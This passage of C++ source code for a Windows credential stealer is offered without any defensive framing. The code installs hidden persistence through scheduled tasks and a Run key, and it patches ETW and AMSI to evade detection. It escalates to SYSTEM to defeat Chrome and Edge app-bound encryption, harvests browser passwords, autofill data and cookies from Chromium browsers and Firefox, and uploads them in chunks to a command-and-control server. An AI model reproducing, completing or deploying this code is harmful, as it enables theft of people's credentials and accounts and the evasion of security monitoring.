                if (SUCCEEDED(def->get_Triggers(&tc)) && tc) {
                    ITrigger* t1 = NULL;
                    if (SUCCEEDED(tc->Create(TASK_TRIGGER_LOGON, &t1)) && t1) {
                        IRepetitionPattern* rp = NULL;
                        if (SUCCEEDED(t1->get_Repetition(&rp)) && rp) {
                            BSTR iv = SysAllocString(L"PT6H"); rp->put_Interval(iv); SysFreeString(iv);
                            rp->put_StopAtDurationEnd(VARIANT_FALSE);
                            rp->Release();
                        }
                        t1->Release();
                    }
                    ITrigger* t2 = NULL;
                    if (SUCCEEDED(tc->Create(TASK_TRIGGER_BOOT, &t2)) && t2) {
                        MyIBootTrigger* bt = NULL;
                        if (SUCCEEDED(t2->QueryInterface(MY_IID_IBootTrigger, (void**)&bt)) && bt) {
                            BSTR dl = SysAllocString(L"PT3M");
                            bt->put_Delay(dl); SysFreeString(dl);
                            bt->Release();
                        }
                        t2->Release();
                    }
                    tc->Release();
                }
                IActionCollection* ac = NULL;
                if (SUCCEEDED(def->get_Actions(&ac)) && ac) {
                    IAction* act = NULL;
                    if (SUCCEEDED(ac->Create(TASK_ACTION_EXEC, &act)) && act) {
                        IExecAction* ea = NULL;
                        if (SUCCEEDED(act->QueryInterface(MY_IID_IExecAction, (void**)&ea)) && ea) {
                            BSTR p = SysAllocString(exe.c_str()); ea->put_Path(p); SysFreeString(p);
                            BSTR ar = SysAllocString(L"--bg");   ea->put_Arguments(ar); SysFreeString(ar);
                            ea->Release();
                        }
                        act->Release();
                    }
                    ac->Release();
                }
                ITaskFolder* folder = NULL;
                BSTR rootB = SysAllocString(L"\\");
                if (SUCCEEDED(svc->GetFolder(rootB, &folder)) && folder) {
                    IRegisteredTask* rt = NULL;
                    BSTR tn = SysAllocString(TASK_NAME);
                    ok = SUCCEEDED(folder->RegisterTaskDefinition(tn, def, TASK_CREATE_OR_UPDATE,
                                                                 v, v, TASK_LOGON_INTERACTIVE_TOKEN, v, &rt));
                    SysFreeString(tn);
                    if (rt) rt->Release();
                    folder->Release();
                }
                SysFreeString(rootB);
                def->Release();
            }
        }
        svc->Release();
    }
    return ok;
}
static void InstallPersistence() {
    std::wstring exe = PersistPath();
    if (!Exists(exe)) exe = SelfPath();
    if (!InstallTask(exe)) {
        std::wstring cmd = L"/create /f /sc onlogon /rl highest /tn \"" + std::wstring(TASK_NAME) +
                           L"\" /tr \"\\\"" + exe + L"\\\" --bg\"";
        SHELLEXECUTEINFOW si{ sizeof(si) };
        si.lpFile = L"schtasks.exe"; si.lpParameters = cmd.c_str();
        si.nShow = SW_HIDE; si.fMask = SEE_MASK_FLAG_NO_UI;
        ShellExecuteExW(&si);
    }
    DropRunKey(exe);
}

/* ---------- transport ---------- */
static bool HttpPost(const std::string& body, const std::string& name, int chunk, int chunks,
                     const std::string& meta) {
    bool ok = false;
    HINTERNET s = WinHttpOpen(A2W(O(UA_STR)).c_str(), WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, NULL, NULL, 0);
    if (!s) return false;
    HINTERNET c = WinHttpConnect(s, A2W(O(C2_HOST_STR)).c_str(), C2_PORT, 0);
    if (c) {
        HINTERNET r = WinHttpOpenRequest(c, L"POST", A2W(O(C2_PATH_STR)).c_str(), NULL,
                                         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (r) {
            WinHttpSetTimeouts(r, 8000, 8000, 15000, 30000);
            std::wstring hdr =
                L"Content-Type: application/octet-stream\r\nX-Auth: " + A2W(O(C2_KEY_STR)) +
                L"\r\nX-Run: "   + A2W(g_run) +
                L"\r\nX-Name: "  + A2W(name) +
                L"\r\nX-Chunk: " + std::to_wstring(chunk) +
                L"\r\nX-Chunks: " + std::to_wstring(chunks) +
                L"\r\nX-Meta: "  + A2W(meta) + L"\r\n";
            BOOL sent = WinHttpSendRequest(r, hdr.c_str(), (DWORD)-1L, (LPVOID)body.data(),
                                           (DWORD)body.size(), (DWORD)body.size(), 0);
            if (sent) {
                WinHttpReceiveResponse(r, NULL);
                DWORD code = 0, len = sizeof(code);
                WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                    WINHTTP_HEADER_NAME_BY_INDEX, &code, &len, WINHTTP_NO_HEADER_INDEX);
                ok = (code == 200);
            }
            WinHttpCloseHandle(r);
        }
        WinHttpCloseHandle(c);
    }
    WinHttpCloseHandle(s);
    return ok;
}
static void SendFile(const std::string& name, const std::string& meta, const std::string& data) {
    if (data.empty()) return;
    int total = (int)((data.size() + CHUNK_SZ - 1) / CHUNK_SZ);
    if (total < 1) total = 1;
    for (int i = 0; i < total; ++i) {
        std::string part = data.substr((size_t)i * CHUNK_SZ, CHUNK_SZ);
        for (int t = 0; t < 4; ++t) {
            if (HttpPost(part, name, i + 1, total, meta)) break;
            Sleep(1500);
        }
        if (i + 1 < total) Sleep(250);
    }
}

/* ---------- entry ---------- */
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmd, int) {
    srand(GetTickCount());
    bool dbg = (lpCmd && strstr(lpCmd, "--debug"));
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

    auto grabArg = [&](const char* tag, std::string& dst) {
        char* p = lpCmd ? strstr(lpCmd, tag) : NULL;
        if (!p) return;
        p += strlen(tag);
        if (*p == '"') { for (++p; *p && *p != '"'; ++p) dst += *p; }
        else for (; *p && *p != ' '; ++p) dst += *p;
    };

    if (lpCmd && strstr(lpCmd, "--abe-only")) {
        g_ulocal = Env(L"%LOCALAPPDATA%");
        g_uroam  = Env(L"%APPDATA%");
        std::string r = "elevated=" + std::string(IsElevated() ? "1" : "0") + "\n";
        for (auto& l : { std::string("Chrome"), std::string("Edge") }) {
            for (auto& a : AppRootsFor(l)) r += l + " root " + W2A(a) + " exe=" + (Exists(a + L"\\elevation_service.exe") ? "1" : "0") + "\n";
            r += l + " svc=" + (VendorFor(l) && ServiceExists(VendorFor(l)->svc) ? "1" : "0") + "\n";
        }
        std::vector<std::wstring> kn; EnumSealKeys(kn);
        r += "cng keys:"; for (auto& k : kn) r += " [" + W2A(k) + "]"; r += "\n";
        std::vector<AbeItem> items; HarvestAbeBlobs(items);
        for (auto& it : items) {
            std::vector<uint8_t> sys;
            bool sysOk = WithSystemToken(UnwrapOuter, (void*)&it.blob, sys);
            r += it.label + ": sys=" + (sysOk ? "1" : "0");
            if (sysOk) {
                std::vector<uint8_t> plain = DpapiUnprotect(sys);
                r += " user=" + std::string(plain.empty() ? "0" : "1");
                if (!plain.empty() && plain.size() >= 5) {
                    uint32_t l1 = Rd32(plain, 0);
                    if (4 + l1 + 4 <= plain.size()) {
                        uint32_t l2 = Rd32(plain, 4 + l1);
                        if (l2 >= 1 && 4 + l1 + 4 + l2 <= plain.size())
                            r += " flag=" + std::to_string((int)plain[4 + l1 + 4]);
                    }
                }
            }
            r += "\n";
        }
        ResolveAbeKeys();
        r += g_dbg + "\n";
        for (auto& kv : g_abe) r += "KEY " + kv.first + " " + ToHex(kv.second) + "\n";
        Log(r);
        if (dbg) MessageBoxA(NULL, r.c_str(), "abe", MB_OK);
        CoUninitialize();
        return 0;
    }

    if (lpCmd && strstr(lpCmd, "--elevated-job=")) {
        std::string inf, outf, pers;
        grabArg("--elevated-job=", inf);
        grabArg("--out=", outf);
        grabArg("--persist=", pers);

        std::string req = ReadAll(A2W(inf));
        std::vector<AbeItem> items;
        size_t pos = 0;
        while (pos < req.size()) {
            size_t e = req.find('\n', pos);
            if (e == std::string::npos) break;
            std::string line = req.substr(pos, e - pos); pos = e + 1;
            size_t t1 = line.find('\t'); if (t1 == std::string::npos) continue;
            size_t t2 = line.find('\t', t1 + 1); if (t2 == std::string::npos) continue;
            items.push_back({ line.substr(0, t1), A2W(line.substr(t1 + 1, t2 - t1 - 1)), Unhex(line.substr(t2 + 1)) });
        }

        std::string res, pend;
        ElevatedAttempt(items, res);
        for (auto& it : items)
            if (res.find("\t" + it.label + "\t") == std::string::npos)
                pend += it.label + "\t" + W2A(it.dir) + "\t" + ToHex(it.blob) + "\n";

        if (!pend.empty()) {
            std::wstring pf = TempDir() + L"\\sys_in_" + RandName() + L".txt";
            std::wstring sf = TempDir() + L"\\sys_out_" + RandName() + L".txt";
            FILE* f = _wfopen(pf.c_str(), L"wb");
            if (f) {
                fwrite(pend.data(), 1, pend.size(), f);
                fclose(f);
                std::wstring p = L"--sys-peel=\"" + pf + L"\" --out=\"" + sf + L"\"";
                if (RunAsSystem(p, L"")) res += ReadAll(sf);
                else g_dbg += "ABE: no SYSTEM worker\n";
            }
            DeleteFileW(pf.c_str());
            DeleteFileW(sf.c_str());
        }

        FILE* o = _wfopen(A2W(outf).c_str(), L"wb");
        if (o) { fwrite(res.data(), 1, res.size(), o); fclose(o); }
        Log("--- elevated ---\n" + g_dbg + "\n");

        if (!pers.empty()) {
            std::wstring src = A2W(pers), persist = PersistPath();
            CreateDirectoryW(TrustedDir().c_str(), NULL);
            if (CopyFileW(src.c_str(), persist.c_str(), FALSE))
                SetFileAttributesW(persist.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            std::wstring bdir = BrowserDirTarget();
            if (!bdir.empty()) {
                std::wstring bexe = bdir + L"\\" + PERSIST_NAME;
                if (!CopyFileW(src.c_str(), bexe.c_str(), FALSE)) g_dbg += "browser-dir copy failed\n";
            }
            InstallPersistence();
        }
        CoUninitialize();
        return 0;
    }

    if (lpCmd && strstr(lpCmd, "--abe-decrypt=")) {
        std::string bf, label, of;
        grabArg("--abe-decrypt=", bf);
        grabArg("--label=", label);
        grabArg("--out=", of);
        std::vector<uint8_t> blob = ReadVec(A2W(bf));
        if (blob.size() > 32) {
            std::vector<uint8_t> k = AbeViaCom(blob, label);
            if (k.size() != 32) k = AbeViaDpapi(blob);
            if (k.size() == 32) {
                FILE* f = _wfopen(A2W(of).c_str(), L"wb");
                if (f) { fwrite(k.data(), 1, 32, f); fclose(f); }
            }
        }
        CoUninitialize();
        return 0;
    }

    if (lpCmd && strstr(lpCmd, "--sys-peel=")) {
        g_isSystem = true;
        std::string inf, outf;
        grabArg("--sys-peel=", inf);
        grabArg("--out=", outf);
        std::string req = ReadAll(A2W(inf)), res;
        size_t pos = 0;
        while (pos < req.size()) {
            size_t e = req.find('\n', pos);
            if (e == std::string::npos) break;
            std::string line = req.substr(pos, e - pos); pos = e + 1;
            size_t t1 = line.find('\t'); if (t1 == std::string::npos) continue;
            size_t t2 = line.find('\t', t1 + 1); if (t2 == std::string::npos) continue;
            std::string label = line.substr(0, t1);
            std::wstring dir = A2W(line.substr(t1 + 1, t2 - t1 - 1));
            std::vector<uint8_t> blob = Unhex(line.substr(t2 + 1));
            char kind = 0; std::vector<uint8_t> p;
            if (PeelSystem(blob, kind, p, true)) {
                if (kind == 'K') { if (ValidateAbeKey(dir, p)) res += "K\t" + label + "\t" + ToHex(p) + "\n"; }
                else res += "S\t" + label + "\t" + ToHex(p) + "\n";
            }
        }
        FILE* f = _wfopen(A2W(outf).c_str(), L"wb");
        if (f) { fwrite(res.data(), 1, res.size(), f); fclose(f); }
        CoUninitialize();
        return 0;
    }

    bool firstRun = !RunKeySet();
    if (firstRun) {
        Sleep(SLEEP_MS);
        PatchEtw();
        PatchAmsi();
        if (LooksLikeSandbox()) Sleep(20000);
    }

    g_ulocal = Env(L"%LOCALAPPDATA%");
    g_uroam  = Env(L"%APPDATA%");
    if (g_ulocal.empty() || g_uroam.empty()) {
        wchar_t up[MAX_PATH] = {0};
        GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
        if (g_ulocal.empty()) g_ulocal = std::wstring(up) + L"\\AppData\\Local";
        if (g_uroam.empty())  g_uroam  = std::wstring(up) + L"\\AppData\\Roaming";
    }

    wchar_t ub[256] = {0}; DWORD un = 256; GetUserNameW(ub, &un);
    wchar_t cb[256] = {0}; DWORD cn = 256; GetComputerNameW(cb, &cn);
    g_c.user = W2A(ub); g_c.host = W2A(cb);
    g_run = ARandName();
    g_dbg += "elevated=" + std::string(IsElevated() ? "1" : "0") + " local=" + W2A(g_ulocal) + "\n";

    ResolveAbeKeys();
    GrabChromiumFamily();
    GrabFirefox();

    std::string stamp;
    {
        SYSTEMTIME st; GetLocalTime(&st);
        char b[40];
        sprintf(b, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        stamp = b;
    }
    std::string summary =
        "HOST    : " + g_c.host + "\n"
        "USER    : " + g_c.user + "\n"
        "ELEVATED: " + std::string(IsElevated() ? "yes" : "no") + "\n"
        "TIME    : " + stamp + "\n"
        "RUN     : " + g_run + "\n"
        "PASSWORDS: " + std::to_string(g_c.nPw) + "\n"
        "UNDECRYPTED: " + std::to_string(g_c.nUnd) + "\n"
        "AUTOFILL : " + std::to_string(g_c.nAf) + "\n"
        "COOKIES  : " + std::to_string(g_c.nCk) + "\n"
        "COOKIE_FAIL: " + std::to_string(g_c.nCkBad) + "\n"
        "\n--- debug ---\n" + g_dbg;

    Log(summary);
    Log("\n========== end ==========\n");
    if (dbg) MessageBoxA(NULL, summary.c_str(), "SystemHost debug", MB_OK | MB_ICONINFORMATION);

    SendFile(O("summary.txt"),  Asc(g_c.host + " | " + g_c.user), summary);
    SendFile(O("password.txt"), Asc(std::to_string(g_c.nPw) + " creds"), g_c.pw);
    SendFile(O("AUTOFILL.txt"), Asc(std::to_string(g_c.nAf) + " entries"), g_c.af);
    SendFile(O("cookies.txt"),  Asc(std::to_string(g_c.nCk) + " cookies"), g_c.ck);

    CoUninitialize();
    return 0;
}
